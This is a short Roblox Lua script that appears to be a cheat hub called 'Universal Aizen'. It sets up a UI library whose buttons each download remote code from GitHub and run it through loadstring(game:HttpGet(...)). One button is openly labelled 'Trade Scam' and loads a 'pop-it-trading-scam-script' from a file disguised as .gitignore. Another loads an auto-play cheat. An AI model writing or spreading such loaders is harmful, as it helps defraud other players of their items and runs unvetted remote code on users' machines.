-- Load Kavo UI Library
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Universal Aizen", "Sentinel") -- Updated name

-- Create Main UI Tab
local Tab = Window:NewTab("Aizenhub")
local Section = Tab:NewSection("Aizenhublist")

Section:NewLabel("Welcome to Universal Aizen!")

-- Pop It Trading Script
Section:NewButton("Pop It Trading", "Trade Scam", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Cooked-METHods/pop-it-trading-scam-script/main/.gitignore"))()
    print("Pop It Trading script executed!")
end)

-- Blue Lock Rivals Script
Section:NewButton("Blue Lock Rivals", "Auto play script", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/game/main/TbaoHubBlueLockRivals"))()
    print("Blue Lock Rivals script executed!")
end)

print("Universal Aizen Loaded Successfully!")
